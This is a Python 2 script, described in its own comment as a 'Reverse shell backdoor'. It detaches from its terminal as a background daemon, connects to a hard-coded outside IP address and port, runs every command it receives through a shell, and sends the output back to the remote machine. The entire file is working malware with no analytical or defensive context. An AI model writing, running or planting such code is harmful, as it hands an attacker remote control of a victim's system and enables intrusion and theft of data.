#!/usr/bin/python

# Reverse shell backdoor

import os,sys,socket,subprocess

def vidkr_dveri():
	HOST = '130.211.102.76'    # The remote host
	PORT = 55556            # The same port as used by the server
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	# Connect to attacker machine
	s.connect((HOST, PORT))
	# Send we are connected
	s.send('[*] Connection Established!')
	# Start loop
	while 1:
	     # Recieve shell command
	     data = s.recv(1024)
	     # If its quit, then break out and close socket
	     if data == "quit": break
	
	     # Do shell command
	     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	
	     # Read output
	     stdout_value = proc.stdout.read() + proc.stderr.read()
	     # Send output to attacker
	     s.send(stdout_value)
	# Close socket
	s.close()

if __name__ == "__main__":
	print("Took took ...")

	# Fork the process
	# Create child and exit from parent
	try:
		pid = os.fork()
		if pid > 0:
			sys.exit(0)
	except OSError, e:
		print >> sys.stderr, "fork failed: %d (%s)" % (e.errno, e.strerror)
		sys.exit(1)

	# Change current working dir to "/"
	os.chdir("/")
	# Become session leader of the new session
	os.setsid()
	# Give the childe complete control over permissions
	os.umask(0)

	# Open the door
	vidkr_dveri()
